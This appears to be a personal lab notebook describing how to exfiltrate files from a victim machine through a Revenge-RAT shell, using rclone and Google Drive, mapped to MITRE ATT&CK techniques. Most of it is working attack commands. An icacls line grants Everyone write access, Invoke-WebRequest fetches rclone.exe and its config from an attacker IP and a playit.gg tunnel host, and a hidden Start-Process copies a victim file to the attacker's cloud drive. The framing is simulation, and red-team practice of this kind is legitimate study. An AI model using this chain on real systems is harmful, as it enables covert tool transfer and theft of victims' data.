## MITRE ATT\&CK Exfiltration Simulation via Google Drive using **rclone**

We can exfiltrate data using RAT's built-in download functionality already, it will then save into **E:\Hacking\Tools\Revenge-RAT v0.3\Users\User_name\downloads**. But to simulate it through powershall I deep dive into this. I tried many ways, I tried to build a http server using flask, and then through port forwarding, I tried to send files there. But as the RAT doesn't have write access thats why I didn't manage to do it then. Then I tried to do it directly via Google Drive, but I faced typos there. Then I tried rclone, to do so, it is better to use your own drive. And for this,s I followed **https://console.cloud.google.com/auth/clients?inv=1&invt=AbxtVQ&project=theta-totem-446705-j3** this link, to get the client id and client secret, then I use it later while setting rclone. Here are the following steps to do exfiltration:

### 0. Give Write Access To a Folder
To give a folder **write access**, especially from a script or RAT shell (with limited UI or feedback), you can use PowerShell or `icacls` commands to set permissions. Here's how:

---

## Method: Use `icacls` to Grant Write Access

```cmd
icacls "C:\Your\Target\Folder" /grant Everyone:(OI)(CI)M
```

### Breakdown:

* `Everyone`: Grants access to all users (you can replace with a specific user if needed).
* `(OI)(CI)`: Applies to **files and subfolders** (Object Inherit + Container Inherit).
* `M`: Stands for **Modify**, which includes read/write permissions.

---

## Example:

To make `C:\PublicRAT` writeable:

```cmd
mkdir C:\PublicRAT
icacls "C:\PublicRAT" /grant Everyone:(OI)(CI)M
```

Now your RAT shell should be able to **write files there**, e.g.:

```cmd
cmd.exe /c echo Hello > C:\PublicRAT\test.txt
```

### 1. **Prepare on Attacker Machine**

* Download `rclone` from: [https://rclone.org/downloads/](https://rclone.org/downloads/)
* Extract it somewhere like:
  `E:\Hacking\rclone-v1.69.2-windows-amd64\`

---

### 2. **Configure `rclone` with Google Drive**

In your **attacker machine's terminal**, run:

```bash
rclone config
```

Follow these steps:

1. Type `n` for a new remote.
2. Name it something like: `myStorage`
3. Choose storage type: `drive` (20 for Google Drive)
4. Follow the prompts to authenticate via browser (use your Google account).
5. At the end, type `y` to confirm, then `q` to quit.

This process generates the config file. Then try this command to find the actual location:

```bash
rclone config file
```

It will output something like:

```
Configuration file is stored at: C:\Users\Niloy\.config\rclone\rclone.conf
```

That’s the file you need to send to the victim. Once you find it, copy it to the folder where `rclone.exe` is located (on attacker machine) so you can send both files to the victim:


Then transfer both:

* `rclone.exe`
* `rclone.conf`

to the victim’s machine via the RAT.

---

### 3. **Host Files for Victim to Pull**

To simulate real-world behavior and avoid direct upload via RAT:

1. Copy `rclone.exe` and `rclone.conf` to a web-accessible server or local HTTP server:

   * E.g., start a server:

     ```bash
     python -m http.server 8000
     ```

     In directory where `rclone.exe` and `rclone.conf` are located.

---

### 4. **Use RAT (PowerShell Shell) to Download Files on Victim**

Go through **File Manager** to the expected folder and upload the **reclone.conf**, as it is small in size that's why we can upload it directly via RAT. But as the **rclone.exe** is big in size, thats why we need to send it via power shall. From the attacker, send PowerShell commands via RAT. You can do the same for the **rclone.conf** also.

```powershell
Invoke-WebRequest -Uri "http://<attacker-ip>:8000/rclone.exe" -OutFile "C:\PublicRAT\rclone.exe"
# Invoke-WebRequest -Uri "http://<attacker-ip>:8000/rclone.conf" -OutFile "C:\PublicRAT\rclone.conf"
```

```powershell
Invoke-WebRequest -Uri "http://192.168.113.226:8000/rclone.exe" -OutFile "C:\NewRAT\rclone.exe"
```

Now `rclone.exe` and its config are on the **victim system**.

---

### 5. **Exfiltrate File Using `rclone` Remotely**

Send via RAT: 

```powershell
Start-Process -WindowStyle Hidden -FilePath "C:\PublicRAT\rclone.exe" -ArgumentList 'copy "C:\Users\Public\Documents\newSecret.txt" myStorage:/ --config "C:\PublicRAT\rclone.conf"'
```

Notes:

* `myStorage` is the name you used during `rclone config`.
* You can exfiltrate any file the user has permission to read.

---

### 6. **Check Google Drive**

Your file (e.g., `secret.txt`) should now appear in the root of your Google Drive. You need to wait for some minutes (1-2) to get the file there.

---

### MITRE ATT\&CK Coverage:

![alt text](flow.png)

| Tactic              | Technique                                 | Description                         |
| ------------------- | ----------------------------------------- | ----------------------------------- |
| Execution           | T1059 - Command and Scripting Interpreter | PowerShell shell via RAT            |
| Ingress Tool        | T1105 - Ingress Tool Transfer             | Download `rclone.exe` and `.conf`   |
| Exfiltration        | T1567.002 - Exfil to Cloud Storage        | Send files to Google Drive          |
| Persistence/Stealth | T1027 - Obfuscated Files or Info          | Using trusted tools like PowerShell |


### Full process using port forwarding

* Start the playit.gg both from homescreen and the playit-0.9.3-signed from **E:\Hacking\Tools\PlayIt.gg**
* E.g., start the server from **E:\Hacking\rclone-v1.69.2-windows-amd64\rclone-payload** :
   ```bash
   python -m http.server 1335
   ```
* Then do the following:
  ```powershall
  mkdir C:\PublicRAT
  icacls "C:\PublicRAT" /grant Everyone:(OI)(CI)M
  ```
  
  Now your RAT shell should be able to **write files there**, e.g.:
  
  ```cmd
  cmd.exe /c echo Hello > C:\PublicRAT\test.txt
  ```
* If the **test.txt** successfully writes in that location, then do:
  ```powershell
  Invoke-WebRequest -Uri "http://silver-generate.gl.at.ply.gg:22366/rclone.exe" -OutFile "C:\PublicRAT\rclone.exe"
  Invoke-WebRequest -Uri "http://silver-generate.gl.at.ply.gg:22366/rclone.conf" -OutFile "C:\PublicRAT\rclone.conf"
  ```
* Then transfer data using the following convention:
  ```powershell
  Start-Process -WindowStyle Hidden -FilePath "C:\PublicRAT\rclone.exe" -ArgumentList 'copy "C:\Users\Public\Documents\newSecret.txt" myStorage:/ --config "C:\PublicRAT\rclone.conf"'
  ```
* Check your BSSE drive and click recent, you will get the desired file.
